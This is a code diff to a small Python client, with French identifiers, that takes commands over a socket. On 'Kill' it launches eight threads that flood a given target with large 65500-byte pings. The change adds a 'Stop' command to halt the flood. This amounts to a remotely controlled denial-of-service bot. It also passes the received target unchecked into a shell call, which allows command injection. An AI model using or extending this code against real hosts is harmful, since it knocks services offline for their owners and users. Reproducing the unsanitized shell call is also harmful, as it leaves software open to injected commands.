@@ -3,9 +3,11 @@ import threading
 import subprocess
 import os
 
+EnFonction = True
 
 def thread_recevoir(client_socket):
     while True:
+        global EnFonction
         print("on attend")
         reponse = client_socket.recv(1024).decode()
         print("recu")
@@ -13,14 +15,20 @@ def thread_recevoir(client_socket):
         text = reponse.split()
         print(text[0])
         if (text[0] == 'Kill'):
+            EnFonction = True
             print("yolo")
             for i in range(0, 8):
                 allo = threading.Thread(target=thread_ping, args=(text[1],))
                 allo.start()
+        if (text[0] == 'Stop'):
+            EnFonction = False
+
+
 
 
 def thread_ping(rest):
-    while True:
+    global EnFonction
+    while EnFonction:
         hostname = "69.69.69.69"  # example
         subprocess.call(['ping', "-l", "65500", "-w", "1", "-n", "1", hostname])
         response = os.system("ping -c 3 " + rest)
